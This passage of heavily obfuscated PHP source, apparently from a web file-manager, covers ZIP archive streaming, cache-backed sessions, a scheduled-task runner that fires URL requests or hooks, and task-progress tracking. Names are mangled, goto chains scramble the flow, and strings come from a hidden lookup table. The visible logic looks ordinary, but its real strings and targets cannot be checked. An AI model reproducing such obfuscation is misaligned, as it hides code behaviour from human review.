$this->send($B†â‡íØ£´); $this->cdr_ofs += strlen($B†â‡íØ£´); goto b„›¢®ŠĞ™; d¹µÊ‚Ë™ö: $c¢†ÚÓñŠå =& $_SERVER[îÖ]; list($eæ¸½ÁŸÛ, $aŸ×«ƒ‘Ç, $c­‹Ó¬ÚÊ™, $aìœæá¬, $bíª§§øäØ, $fª‘‰öáˆ’) = $FÜçà Œ¹Å; $b¬”ÒÂßµ = $c¢†ÚÓñŠå[33]; goto F°à¯íñö; F°à¯íñö: $Bà´œâ¯‰ò = $this->dosTime(time()); $D†×Û»°Ó™ = array(array($c¢†ÚÓñŠå[2007], static::CDR_FILE_SIGNATURE), array($c¢†ÚÓñŠå[2008], static::ZIP_VERSION_64), array($c¢†ÚÓñŠå[2008], static::ZIP_VERSION_64), array($c¢†ÚÓñŠå[2008], 8), array($c¢†ÚÓñŠå[2008], $aŸ×«ƒ‘Ç), array($c¢†ÚÓñŠå[2007], $Bà´œâ¯‰ò), array($c¢†ÚÓñŠå[2007], $c­‹Ó¬ÚÊ™), array($c¢†ÚÓñŠå[2007], 4294967295), array($c¢†ÚÓñŠå[2007], 4294967295), array($c¢†ÚÓñŠå[2008], strlen($eæ¸½ÁŸÛ)), array($c¢†ÚÓñŠå[2008], 32), array($c¢†ÚÓñŠå[2008], strlen($b¬”ÒÂßµ)), array($c¢†ÚÓñŠå[2008], 0), array($c¢†ÚÓñŠå[2008], 0), array($c¢†ÚÓñŠå[2007], 32), array($c¢†ÚÓñŠå[2007], 4294967295)); $a—Ì¸’ÂÛà = array(array($c¢†ÚÓñŠå[2008], 1), array($c¢†ÚÓñŠå[2008], 28), array($c¢†ÚÓñŠå[2009], $bíª§§øäØ), array($c¢†ÚÓñŠå[2009], $aìœæá¬), array($c¢†ÚÓñŠå[2009], $fª‘‰öáˆ’), array($c¢†ÚÓñŠå[2007], 0)); goto fÈçõ‡†Ä; fÈçõ‡†Ä: $AÂÚŠ‰¯¯ = $this->packFields($D†×Û»°Ó™); $aÎõ‹ÉÃ‹Â = $this->packFields($a—Ì¸’ÂÛà); $B†â‡íØ£´ = $AÂÚŠ‰¯¯ . $eæ¸½ÁŸÛ . $b¬”ÒÂßµ . $aÎõ‹ÉÃ‹Â; goto CĞÙóß‚¤Ÿ; b„›¢®ŠĞ™: } protected function addCdr64Eof() { goto eœóç¾¸±’; cš³ùò”İß: $c¡Ïäá±É = $this->ofs; $c¼ò§«ï„¶ = array(array($FŠ¼Ã­÷Ëè[2007], static::ZIP64_CDR_EOF_SIGNATURE), array($FŠ¼Ã­÷Ëè[2009], 44), array($FŠ¼Ã­÷Ëè[2008], static::ZIP_VERSION_64), array($FŠ¼Ã­÷Ëè[2008], static::ZIP_VERSION_64), array($FŠ¼Ã­÷Ëè[2007], 0), array($FŠ¼Ã­÷Ëè[2007], 0), array($FŠ¼Ã­÷Ëè[2009], $Fåå˜‰£†·), array($FŠ¼Ã­÷Ëè[2009], $Fåå˜‰£†·), array($FŠ¼Ã­÷Ëè[2009], $Eª†‰‰é»—), array($FŠ¼Ã­÷Ëè[2009], $c¡Ïäá±É)); $E½„ÄÊÂ¾ = $this->packFields($c¼ò§«ï„¶); goto fÛâ–Îƒà; fÛâ–Îƒà: $this->send($E½„ÄÊÂ¾); goto CºŠÀĞ†«; eœóç¾¸±’: $FŠ¼Ã­÷Ëè =& $_SERVER[îÖ]; $Fåå˜‰£†· = count($this->files); $Eª†‰‰é»— = $this->cdr_ofs; goto cš³ùò”İß; CºŠÀĞ†«: } protected function addCdr64Locator() { goto BÅ…Ó‹èÏ¼; AœÇÄÍšˆ¡: $FŠ´ØÔÀ = $this->ofs; $eíµÕÙé¹× = array(array($C†ºÈ‹½àª[2007], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($C†ºÈ‹½àª[2007], 0), array($C†ºÈ‹½àª[2009], $FŠ´ØÔÀ + $B‹öˆ¿ßŒ), array($C†ºÈ‹½àª[2007], 1)); $CœñÖ´ŞÜí = $this->packFields($eíµÕÙé¹×); goto b¦…à«•¹; b¦…à«•¹: $this->send($CœñÖ´ŞÜí); goto bÖÍÖµäô; BÅ…Ó‹èÏ¼: $C†ºÈ‹½àª =& $_SERVER[îÖ]; $c„¥¾»¹— = count($this->files); $B‹öˆ¿ßŒ = $this->cdr_ofs; goto AœÇÄÍšˆ¡; bÖÍÖµäô: } protected function addCdrEof() { goto EÊÒ›ŒøÚë; cİÊºÆ‰ä­: $CŒñø¼òİŠ = $this->ofs; $dá×Åµ÷™Ï = $aˆÍÒ©•Ğ[33]; $cÑÀÓŠ‚‘– = array(array($aˆÍÒ©•Ğ[2007], static::CDR_EOF_SIGNATURE), array($aˆÍÒ©•Ğ[2008], 0), array($aˆÍÒ©•Ğ[2008], 0), array($aˆÍÒ©•Ğ[2008], $E¯¹åİ‡¸), array($aˆÍÒ©•Ğ[2008], $E¯¹åİ‡¸), array($aˆÍÒ©•Ğ[2007], 4294967295), array($aˆÍÒ©•Ğ[2007], 4294967295), array($aˆÍÒ©•Ğ[2008], strlen($dá×Åµ÷™Ï))); goto Eîİàå¬È; Eîİàå¬È: $f×åŒÁñ«ò = $this->packFields($cÑÀÓŠ‚‘–) . $dá×Åµ÷™Ï; $this->send($f×åŒÁñ«ò); goto e°óöÆ¸±; EÊÒ›ŒøÚë: $aˆÍÒ©•Ğ =& $_SERVER[îÖ]; $E¯¹åİ‡¸ = count($this->files); $F¤¼åÈİ¾ = $this->cdr_ofs; goto cİÊºÆ‰ä­; e°óöÆ¸±: } protected function addCdr() { foreach ($this->files as $Dµ¸£¹Ï·‡) { $this->addCdrFile($Dµ¸£¹Ï·‡); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $E êÈãóÔ =& $_SERVER[îÖ]; $F¨õ¦„¹¨Ú = $E êÈãóÔ[202]; if ($this->outputName) { $b¿è½§ŠÄİ = trim(str_replace(array($E êÈãóÔ[113], $E êÈãóÔ[55], $E êÈãóÔ[93], $E êÈãóÔ[67], $E êÈãóÔ[217], $E êÈãóÔ[986]), $E êÈãóÔ[33], $this->outputName)); $AÀÅ¬‹Å¢Ø = rawurlencode($b¿è½§ŠÄİ); $F¨õ¦„¹¨Ú .= "\73\x20\146\x69\x6c\145\x6e\141\155\145\52\75\165\x74\146\55\70\47\47{$AÀÅ¬‹Å¢Ø}"; } $C¡ÃÔ¾ÚÎ = array($E êÈãóÔ[199] => $E êÈãóÔ[2010], $E êÈãóÔ[2011] => $F¨õ¦„¹¨Ú, $E êÈãóÔ[2012] => $E êÈãóÔ[2013], $E êÈãóÔ[2014] => $E êÈãóÔ[2015], $E êÈãóÔ[2016] => $E êÈãóÔ[2017]); foreach ($C¡ÃÔ¾ÚÎ as $DêÎ¬·»ğ§ => $dÍ©³µŠ¾Æ) { header($DêÎ¬·»ğ§ . $E êÈãóÔ[874] . $dÍ©³µŠ¾Æ); } } protected function send($fÚŸ…ˆßÖ¦) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $fÚŸ…ˆßÖ¦); } protected final function dosTime($aÍæŒ£ƒè) { $d˜µƒĞ¹Ù‹ =& $_SERVER[îÖ]; $BÇ ·Øµùœ = getdate($aÍæŒ£ƒè); if ($BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[1720]] < 1980) { $BÇ ·Øµùœ = array($d˜µƒĞ¹Ù‹[1720] => 1980, $d˜µƒĞ¹Ù‹[2018] => 1, $d˜µƒĞ¹Ù‹[2019] => 1, $d˜µƒĞ¹Ù‹[2020] => 0, $d˜µƒĞ¹Ù‹[2021] => 0, $d˜µƒĞ¹Ù‹[2022] => 0); } $BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[1720]] -= 1980; return $BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[1720]] << 25 | $BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[2018]] << 21 | $BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[2019]] << 16 | $BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[2020]] << 11 | $BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[2021]] << 5 | $BÇ ·Øµùœ[$d˜µƒĞ¹Ù‹[2022]] >> 1; } protected function packFields($F× Ù„ßê) { $aœ½®Œ¦Å› =& $_SERVER[îÖ]; $BõƒöÂØ  = $aœ½®Œ¦Å›[33]; $a«›ªëÎ« = array(); foreach ($F× Ù„ßê as $e…ìÏ¢ë‰) { $BõƒöÂØ  .= $e…ìÏ¢ë‰[0]; $a«›ªëÎ«[] = $e…ìÏ¢ë‰[1]; } array_unshift($a«›ªëÎ«, $BõƒöÂØ ); return call_user_func_array($aœ½®Œ¦Å›[2023], $a«›ªëÎ«); } protected function filterFilename($B©èÁ©£“¼) { $e¶¶Œ¬Ş =& $_SERVER[îÖ]; return str_replace(array($e¶¶Œ¬Ş[93], $e¶¶Œ¬Ş[4], $e¶¶Œ¬Ş[176], $e¶¶Œ¬Ş[69], $e¶¶Œ¬Ş[113], $e¶¶Œ¬Ş[919], $e¶¶Œ¬Ş[922], $e¶¶Œ¬Ş[271]), $e¶¶Œ¬Ş[70], $B©èÁ©£“¼); } } goto cÚÄÄ¯‚õ; AÚ¶ƒó£Ÿ†: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto d£î«—°£; cåÚËŒù¿: $F¶Û¼§¡®Ä = $GLOBALS[$Fç²©ã„ß[6]][$Fç²©ã„ß[337]]; self::$sessionTime = $F¶Û¼§¡®Ä[$Fç²©ã„ß[1391]]; $B¸Œ¥ÒÀ‚š = SESSION_ID; goto EøŞ¬º…•ø; câ‡è¯ë´ï: return $E¸Ì¬ÉÀØ¤; goto dÓ¢ØÑ…Éƒ; CµÎ‹â„Æß: switch ($F‘¾¶‡ÙÃ˜) { case $Fç²©ã„ß[17]: self::$handle = Model($Fç²©ã„ß[756]); break; case $Fç²©ã„ß[757]: self::$handle = new CacheRedis($aæÁàŒî–, $A¥–êÀéƒÎ); break; case $Fç²©ã„ß[758]: self::$handle = new CacheMemcached($aæÁàŒî–, $A¥–êÀéƒÎ); break; case $Fç²©ã„ß[167]: $aæÁàŒî–[$Fç²©ã„ß[75]] = $aæÁàŒî–[$Fç²©ã„ß[75]] . $Fç²©ã„ß[1394]; self::$handle = new CacheFile($aæÁàŒî–, $A¥–êÀéƒÎ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $E¸Ì¬ÉÀØ¤ = new self(); goto câ‡è¯ë´ï; d£î«—°£: $Fç²©ã„ß =& $_SERVER[îÖ]; static $E¸Ì¬ÉÀØ¤ = false; if ($E¸Ì¬ÉÀØ¤) { return $E¸Ì¬ÉÀØ¤; } goto cåÚËŒù¿; EøŞ¬º…•ø: $B¸Œ¥ÒÀ‚š = _get($GLOBALS, $Fç²©ã„ß[1392], $B¸Œ¥ÒÀ‚š); if (self::$sessionSign) { } else { if (Cookie::get($B¸Œ¥ÒÀ‚š)) { self::$sessionSign = Cookie::get($B¸Œ¥ÒÀ‚š); } else { self::$sessionSign = guid(); } } Cookie::setSafe($B¸Œ¥ÒÀ‚š, self::$sessionSign, self::$sessionTime); goto d„Ú„ØµËÍ; d„Ú„ØµËÍ: $F‘¾¶‡ÙÃ˜ = $F¶Û¼§¡®Ä[$Fç²©ã„ß[1393]]; $aæÁàŒî– = $F¶Û¼§¡®Ä[$F‘¾¶‡ÙÃ˜]; $A¥–êÀéƒÎ = $F¶Û¼§¡®Ä[$Fç²©ã„ß[755]]; goto CµÎ‹â„Æß; dÓ¢ØÑ…Éƒ: } public static function sign($EÙ×ó¼ = false) { $EÙ×ó¼ && (self::$sessionSign = $EÙ×ó¼); self::init(); return self::$sessionSign; } public static function set($A°¿ÀËæ«, $BÚŠËŒ‘Ê = false) { self::init(); if (is_array($A°¿ÀËæ«)) { foreach ($A°¿ÀËæ« as $bñÏÈˆ£Œó => $BÖ…Ú”Ê†ñ) { array_set_value(self::$data, $bñÏÈˆ£Œó, $BÖ…Ú”Ê†ñ); } } else { array_set_value(self::$data, $A°¿ÀËæ«, $BÚŠËŒ‘Ê); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fµ˜Šİ¦£ = false) { self::init(); if (!$fµ˜Šİ¦£) { return self::$data; } return array_get_value(self::$data, $fµ˜Šİ¦£); } public static function remove($aô†³š‡) { self::init(); unset(self::$data[$aô†³š‡]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[îÖ][760])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Cí°Œ»ïŸ; dÒÌÈø±¥: http_close(); self::valueSet($f®‡ñå¦Ğí[1395], $f®‡ñå¦Ğí[83]); Hook::bind($f®‡ñå¦Ğí[1397], $f®‡ñå¦Ğí[1398]); goto F«ñÎŸ®±É; Cí°Œ»ïŸ: $f®‡ñå¦Ğí =& $_SERVER[îÖ]; if (self::valueGet($f®‡ñå¦Ğí[688]) != $f®‡ñå¦Ğí[83]) { return; } if (self::valueGet($f®‡ñå¦Ğí[1395]) == $f®‡ñå¦Ğí[83]) { $Aåé´‚ ìğ = self::valueGet($f®‡ñå¦Ğí[1396]); if (time() - $Aåé´‚ ìğ > 3600 * 2) { self::restart(); } return; } goto dÒÌÈø±¥; F«ñÎŸ®±É: while (!0) { self::cacheClear(); if (self::valueGet($f®‡ñå¦Ğí[688]) != $f®‡ñå¦Ğí[83]) { self::valueSet($f®‡ñå¦Ğí[1395], $f®‡ñå¦Ğí[468]); self::log($f®‡ñå¦Ğí[1399]); die; } self::valueSet($f®‡ñå¦Ğí[1395], $f®‡ñå¦Ğí[83]); self::valueSet($f®‡ñå¦Ğí[1396], time()); self::taskRunAll(); sleep(self::valueGet($f®‡ñå¦Ğí[1400])); } goto eÖëØ•‰†ö; eÖëØ•‰†ö: } public static function restart() { $E—Ë®è¾µ =& $_SERVER[îÖ]; http_close(); self::valueSet($E—Ë®è¾µ[688], $E—Ë®è¾µ[468]); sleep(self::valueGet($E—Ë®è¾µ[1400]) + 5); self::valueSet($E—Ë®è¾µ[1395], $E—Ë®è¾µ[468]); self::valueSet($E—Ë®è¾µ[688], $E—Ë®è¾µ[83]); } public static function shutdownEvent() { $eØÓ“öÙ°¨ =& $_SERVER[îÖ]; self::valueSet($eØÓ“öÙ°¨[1395], $eØÓ“öÙ°¨[468]); self::log($eØÓ“öÙ°¨[1401]); } public static function config($A½…ÌïêË, $D˜”÷ÏÒ´–) { $cªÛ¿îÚŸÊ =& $_SERVER[îÖ]; $cèÒáõ¥¢ = 20; $D˜”÷ÏÒ´– = intval($D˜”÷ÏÒ´–) <= $cèÒáõ¥¢ ? $cèÒáõ¥¢ : intval($D˜”÷ÏÒ´–); self::valueSet($cªÛ¿îÚŸÊ[688], $A½…ÌïêË); self::valueSet($cªÛ¿îÚŸÊ[1400], $D˜”÷ÏÒ´–); } private static function taskRunAll() { $d–ÒÒÇã =& $_SERVER[îÖ]; $e‰ãŞ§ô°ñ = Model($d–ÒÒÇã[1402])->listData(); $d…Ïƒ‹¶äò = count($e‰ãŞ§ô°ñ); for ($b™õ“×Ê¿˜ = 0; $b™õ“×Ê¿˜ < $d…Ïƒ‹¶äò; $b™õ“×Ê¿˜++) { $Eò–ƒñÁÒë = $e‰ãŞ§ô°ñ[$b™õ“×Ê¿˜]; if ($Eò–ƒñÁÒë[$d–ÒÒÇã[1403]] != $d–ÒÒÇã[83]) { continue; } if (!self::taskTimeCheck($Eò–ƒñÁÒë)) { continue; } self::taskRun($Eò–ƒñÁÒë); } Hook::trigger($d–ÒÒÇã[1404]); } private static function taskTimeCheck($Fµ¥İ¹„‰î) { goto D…ŒôêÇš; D…ŒôêÇš: $AäÕœòê…Æ =& $_SERVER[îÖ]; $c¨Ê÷óï”ò = json_decode($Fµ¥İ¹„‰î[$AäÕœòê…Æ[190]], !0); $AÊÂìõœ¹— = intval($Fµ¥İ¹„‰î[$AäÕœòê…Æ[1396]]); goto fé¡¾•ùÜõ; fé¡¾•ùÜõ: $AİÈéÍÒ›× = strtotime($AäÕœòê…Æ[1405] . $c¨Ê÷óï”ò[$AäÕœòê…Æ[1406]] . $AäÕœòê…Æ[1407]) - strtotime($AäÕœòê…Æ[1408]); $DÀ´Šöºå = time() - strtotime(date($AäÕœòê…Æ[1409]) . $AäÕœòê…Æ[1410]); $cŠÅğ®‹©î = $DÀ´Šöºå >= $AİÈéÍÒ›× && $DÀ´Šöºå <= $AİÈéÍÒ›× + 3600; goto D°Æ‰Ë¿Á; D°Æ‰Ë¿Á: switch ($c¨Ê÷óï”ò[$AäÕœòê…Æ[29]]) { case $AäÕœòê…Æ[1411]: if (time() - $AÊÂìõœ¹— < 3600 * 24 * 30) { return !1; } if ($c¨Ê÷óï”ò[$AäÕœòê…Æ[1411]] == date($AäÕœòê…Æ[1412]) && $cŠÅğ®‹©î) { return !0; } break; case $AäÕœòê…Æ[1413]: if (time() - $AÊÂìõœ¹— < 3600 * 24 * 7) { return !1; } $BéÜ²²‚ Ò = date($AäÕœòê…Æ[1414]) == 0 ? 7 : date($AäÕœòê…Æ[1414]); if ($c¨Ê÷óï”ò[$AäÕœòê…Æ[1413]] == $BéÜ²²‚ Ò && $cŠÅğ®‹©î) { return !0; } break; case $AäÕœòê…Æ[1406]: if (time() - $AÊÂìõœ¹— < 3600 * 24) { return !1; } if ($cŠÅğ®‹©î) { return !0; } break; case $AäÕœòê…Æ[1415]: if (time() - $AÊÂìõœ¹— >= floatval($c¨Ê÷óï”ò[$AäÕœòê…Æ[1415]]) * 60) { return !0; } break; default: break; } return !1; goto aÂï‘áˆ; aÂï‘áˆ: } public static function taskRun($c¸±äÄÄœ) { goto EÄÕ„äŞ©å; EÄÕ„äŞ©å: $dÏ˜´ï‘Æ =& $_SERVER[îÖ]; self::log($dÏ˜´ï‘Æ[1416] . $c¸±äÄÄœ[$dÏ˜´ï‘Æ[367]] . $dÏ˜´ï‘Æ[1417] . $c¸±äÄÄœ[$dÏ˜´ï‘Æ[28]] . $dÏ˜´ï‘Æ[1418] . $c¸±äÄÄœ[$dÏ˜´ï‘Æ[1419]]); Model($dÏ˜´ï‘Æ[1402])->run($c¸±äÄÄœ[$dÏ˜´ï‘Æ[367]]); goto AÒ¤ÚÎ‹Î; dï©ë…™¾Œ: Model($dÏ˜´ï‘Æ[1420])->add(array($dÏ˜´ï‘Æ[1421] => $dÏ˜´ï‘Æ[33], $dÏ˜´ï‘Æ[1422] => $dÏ˜´ï‘Æ[468], $dÏ˜´ï‘Æ[29] => $dÏ˜´ï‘Æ[1423] . $c¸±äÄÄœ[$dÏ˜´ï‘Æ[367]], $dÏ˜´ï‘Æ[1424] => json_encode(array($dÏ˜´ï‘Æ[28] => $c¸±äÄÄœ[$dÏ˜´ï‘Æ[28]], $dÏ˜´ï‘Æ[1425] => timeFloat() - $eõ×çÆÉ•°, $dÏ˜´ï‘Æ[281] => $e´øÉó¨Ñù)))); self::log($dÏ˜´ï‘Æ[1426] . $c¸±äÄÄœ[$dÏ˜´ï‘Æ[367]] . $dÏ˜´ï‘Æ[1427] . $e´øÉó¨Ñù); return !0; goto fôõ¥ÈÂµ; AÒ¤ÚÎ‹Î: $eõ×çÆÉ•° = timeFloat(); $e´øÉó¨Ñù = $dÏ˜´ï‘Æ[33]; switch ($c¸±äÄÄœ[$dÏ˜´ï‘Æ[29]]) { case $dÏ˜´ï‘Æ[295]: $Bâ»‚ŸÒã‡ = url_request($c¸±äÄÄœ[$dÏ˜´ï‘Æ[1419]], $dÏ˜´ï‘Æ[216], !1, !1, !1, !1, 5); $e´øÉó¨Ñù = strlen($Bâ»‚ŸÒã‡); break; case $dÏ˜´ï‘Æ[215]: $e´øÉó¨Ñù = Hook::apply($c¸±äÄÄœ[$dÏ˜´ï‘Æ[1419]]); default: break; } goto dï©ë…™¾Œ; fôõ¥ÈÂµ: } private static function valueGet($eÎ•ŞÕÚ·) { $EÂéİœ¥¾Â =& $_SERVER[îÖ]; $a“ˆ‹ìÁ¶Š = $EÂéİœ¥¾Â[1428]; $Cî›±¨…ß¿ = Model($EÂéİœ¥¾Â[1429])->get($eÎ•ŞÕÚ·, $a“ˆ‹ìÁ¶Š); if (is_null($Cî›±¨…ß¿)) { Model($EÂéİœ¥¾Â[1429])->set($EÂéİœ¥¾Â[1400], 10, $a“ˆ‹ìÁ¶Š); Model($EÂéİœ¥¾Â[1429])->set($EÂéİœ¥¾Â[688], $EÂéİœ¥¾Â[83], $a“ˆ‹ìÁ¶Š); Model($EÂéİœ¥¾Â[1429])->set($EÂéİœ¥¾Â[1395], $EÂéİœ¥¾Â[468], $a“ˆ‹ìÁ¶Š); $Cî›±¨…ß¿ = Model($EÂéİœ¥¾Â[1429])->get($eÎ•ŞÕÚ·, $a“ˆ‹ìÁ¶Š); } return $Cî›±¨…ß¿; } private static function valueSet($cÅµÓ†Æ ¨, $f†ÕÓ®ÜÀ°) { $Bäâ‡Ì„œĞ =& $_SERVER[îÖ]; return Model($Bäâ‡Ì„œĞ[1429])->set($cÅµÓ†Æ ¨, $f†ÕÓ®ÜÀ°, $Bäâ‡Ì„œĞ[1428]); } protected static function log($e­ô½È³©Ö) { write_log($e­ô½È³©Ö, $_SERVER[îÖ][1430]); } private static function cacheClear() { $d¾øÎ¨Ù¬Š =& $_SERVER[îÖ]; $BÃèÉé”×¾ = Model($d¾øÎ¨Ù¬Š[1429])->cacheKey($d¾øÎ¨Ù¬Š[1428]); Cache::clearMemory($BÃèÉé”×¾); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($F‹ë¤á§åê, $BÎÜöŞÙ°Ã = '', $c“ù‹¿¢¥² = 0, $D½Š‹ÊÃœ = '') { goto f’í­à«¼¾; FÁéÍ—èÎ: Hook::bind($cİİÛ…¥ï[1397], array($this, $cİİÛ…¥ï[1439])); Hook::bind($cİİÛ…¥ï[1440], array($this, $cİİÛ…¥ï[1441])); $this->startAfter(); goto e‚­°×ƒÅ·; e‚­°×ƒÅ·: Hook::trigger($cİİÛ…¥ï[1442], $this->task); $this->task[$cİİÛ…¥ï[1436]] = timeFloat(); goto DÅØèÖùÈŸ; f’í­à«¼¾: $cİİÛ…¥ï =& $_SERVER[îÖ]; if (self::get($F‹ë¤á§åê)) { return; } $this->task = array($cİİÛ…¥ï[367] => $F‹ë¤á§åê, $cİİÛ…¥ï[1431] => USER_ID, $cİİÛ…¥ï[1337] => $D½Š‹ÊÃœ, $cİİÛ…¥ï[29] => $BÎÜöŞÙ°Ã, $cİİÛ…¥ï[972] => $cİİÛ…¥ï[33], $cİİÛ…¥ï[970] => $c“ù‹¿¢¥², $cİİÛ…¥ï[984] => 0, $cİİÛ…¥ï[1432] => 0, $cİİÛ…¥ï[1433] => 0, $cİİÛ…¥ï[1434] => timeFloat(), $cİİÛ…¥ï[1435] => 0, $cİİÛ…¥ï[1436] => 0, $cİİÛ…¥ï[1437] => 0, $cİİÛ…¥ï[1438] => 0, $cİİÛ…¥ï[688] => $cİİÛ…¥ï[1395]); goto FÁéÍ—èÎ; DÅØèÖùÈŸ: } public function end() { goto dµ´­­ÓÍ«; EãŞÕ×–é: Hook::unbind($f“¥ì­À£ƒ[1440], array($this, $f“¥ì­À£ƒ[1441])); $this->endAfter(); $this->task = !1; goto a‹ÔŞÆ¯ÚÔ; b–¤Šİõ‚: $AòçŒä¿¿˜ = timeFloat() - $this->task[$f“¥ì­À£ƒ[1434]]; self::log($f“¥ì­À£ƒ[1443] . $this->task[$f“¥ì­À£ƒ[367]] . $f“¥ì­À£ƒ[1444] . $AòçŒä¿¿˜ . $f“¥ì­À£ƒ[1445]); Hook::unbind($f“¥ì­À£ƒ[1397], array($this, $f“¥ì­À£ƒ[1439])); goto EãŞÕ×–é; dµ´­­ÓÍ«: $f“¥ì­À£ƒ =& $_SERVER[îÖ]; if (!$this->task) { return; } if ($this->task[$f“¥ì­À£ƒ[1436]]) { self::valueSet($this->task[$f“¥ì­À£ƒ[367]], !1); } goto b–¤Šİõ‚; a‹ÔŞÆ¯ÚÔ: } public function update($D¡œÑÔ = 0) { goto B‘ÂÂå¥; FßÔôÖƒ: $this->updateAfter(); $bÇ®ªôİ¾è = 0.2; if (timeFloat() - $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1436]] < $bÇ®ªôİ¾è) { return; } goto dĞÈ›åÌ„Ï; Aàİ§Æ°‘: Hook::trigger($dÔ«Éàö„ô[1449], $fÍ‹ùôœõŞ); self::valueSet($fÍ‹ùôœõŞ[$dÔ«Éàö„ô[367]], $fÍ‹ùôœõŞ); goto Dšß´ÄÀê; B‘ÂÂå¥: $dÔ«Éàö„ô =& $_SERVER[îÖ]; $fÍ‹ùôœõŞ =& $this->task; if (!$fÍ‹ùôœõŞ) { return; } goto aÅ¤Ìàè‡…; dĞÈ›åÌ„Ï: $eÌÃÙê Ô¬ = self::get($fÍ‹ùôœõŞ[$dÔ«Éàö„ô[367]]); $e‹áŠÒ–é§ = $eÌÃÙê Ô¬[$dÔ«Éàö„ô[688]]; if ($e‹áŠÒ–é§ == self::STATYS_KILL) { $d·¿•¡¹† = array($dÔ«Éàö„ô[1446] => LNG($dÔ«Éàö„ô[1447]), $dÔ«Éàö„ô[1026] => !1); Cache::set($dÔ«Éàö„ô[1448] . $this->task[$dÔ«Éàö„ô[367]], $d·¿•¡¹†, 30); $this->end(); die; } else { if ($e‹áŠÒ–é§ == self::STATYS_STOP) { $dë¥¬Úİ…À = 2; $eÌÃÙê Ô¬[$dÔ«Éàö„ô[1437]] += $dë¥¬Úİ…À; self::valueSet($fÍ‹ùôœõŞ[$dÔ«Éàö„ô[367]], $eÌÃÙê Ô¬); sleep($dë¥¬Úİ…À); $this->update(); return; } } goto b‡ß¸Ù†Ø­; aÅ¤Ìàè‡…: $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[984]] += $D¡œÑÔ; $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1435]] = timeFloat(); if ($fÍ‹ùôœõŞ[$dÔ«Éàö„ô[970]]) { if ($fÍ‹ùôœõŞ[$dÔ«Éàö„ô[970]] < $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[984]]) { $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[970]] = $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[984]]; } $bñ¾­‚Ô = timeFloat() - $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1434]] - $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1437]]; $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1432]] = $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[984]] / $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[970]]; $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1433]] = $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[984]] / $bñ¾­‚Ô; if ($fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1432]] > 0) { $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1438]] = $bñ¾­‚Ô * (1 - $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1432]]) / $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1432]]; } $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1438]] = $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1438]] <= 0 ? 0 : $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1438]]; } goto FßÔôÖƒ; b‡ß¸Ù†Ø­: $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[688]] = $e‹áŠÒ–é§ ? $e‹áŠÒ–é§ : $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[688]]; $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1437]] = $eÌÃÙê Ô¬[$dÔ«Éàö„ô[1437]] ? $eÌÃÙê Ô¬[$dÔ«Éàö„ô[1437]] : 0; $fÍ‹ùôœõŞ[$dÔ«Éàö„ô[1436]] = timeFloat(); goto Aàİ§Æ°‘; Dšß´ÄÀê: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fÓÊˆÀßç¦) { $CŠ»’ñ”ƒÏ =& $_SERVER[îÖ]; Cache::set($CŠ»’ñ”ƒÏ[1448] . $this->task[$CŠ»’ñ”ƒÏ[367]], $fÓÊˆÀßç¦, 60); return $fÓÊˆÀßç¦; } public static function get($D•çÈéÊƒ) { return self::valueGet($D•çÈéÊƒ); } public static function listData() { $Aô§ŸõÉ­‡ = self::valueGet(); return array_sort_by($Aô§ŸõÉ­‡, $_SERVER[îÖ][1434], !0); } public static function kill($a’å˜íÒ×©) { return self::changeStatus($a’å˜íÒ×©, self::STATYS_KILL); } public static function stop($B ŒÊ–ºÎ) { return self::changeStatus($B ŒÊ–ºÎ, self::STATYS_STOP); } public static function restart($EÏÑ‚¹æ) { return self::changeStatus($EÏÑ‚¹æ, self::STATYS_RUNNING); } public static function killAll() { $D©×¬¼½Š‘ =& $_SERVER[îÖ]; 